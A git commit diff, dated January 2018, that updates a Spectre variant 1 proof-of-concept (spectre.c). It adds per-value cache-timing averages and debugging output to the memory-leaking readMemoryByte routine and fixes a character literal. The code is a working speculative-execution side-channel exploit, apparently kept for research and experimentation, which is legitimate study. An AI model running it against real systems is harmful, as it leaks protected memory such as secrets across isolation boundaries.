091a873dde167dcc8899f0a47aa7f39c182e8b73
Hamish Coleman <hamish@zot.org>
2018-01-05 10:26:44 +0800

    Import newer gist from https://gist.github.com/LionsAd/5116c9cd37f5805c797ed16fafbe93e4 and merge changes

--- spectre.c
+++ spectre.c
@@ -80,13 +80,20 @@ Analysis code
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
   static int results[256];
-  int tries, i, j, k, mix_i, junk = 0;
+  static uint64_t time[256];
+  static uint64_t num_time[256];
+  int tries, i, j, k, mix_i;
+  unsigned int junk = 0;
   size_t training_x, x;
-  register uint64_t time1, time2;
+  register uint32_t time1, time2;
   volatile uint8_t * addr;
 
-  for (i = 0; i < 256; i++)
+  for (i = 0; i < 256; i++) {
     results[i] = 0;
+    time[i] = 0;
+    num_time[i] = 0;
+  }
+
   for (tries = 999; tries > 0; tries--) {
 
     /* Flush array2[256*(0..255)] from cache */
@@ -117,6 +124,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
       time1 = READ_TIMER(&junk); /* READ TIMER */
       junk = * addr; /* MEMORY ACCESS TO TIME */
       time2 = READ_TIMER(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
+
+      time[mix_i] += time2;
+      num_time[mix_i]++;
+
       if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
@@ -134,6 +145,10 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
     if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
       break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
   }
+  for (i = 0; i < 256; i++) {
+    printf("Average time for %d: %f, hits: %d\n", i, (double) (time[i] / num_time[i]), results[i]);
+  }
+
   results[0] ^= junk; /* use junk so code above won’t get optimized out*/
   value[0] = (uint8_t) j;
   score[0] = results[j];
@@ -160,6 +175,7 @@ int main(int argc,
 
   for (i = 0; i < sizeof(array2); i++)
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+
   if (argc == 3) {
     sscanf(argv[1], "%p", (void * * )( & malicious_x));
     malicious_x -= (size_t) array1; /* Convert input value into a pointer */
@@ -172,7 +188,7 @@ int main(int argc,
     readMemoryByte(malicious_x++, value, score);
     printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
     printf("0x%02X=’%c’ score=%d ", value[0],
-      (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);
+      (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
     if (score[1] > 0)
       printf("(second best: 0x%02X score=%d)", value[1], score[1]);
     printf("\n");
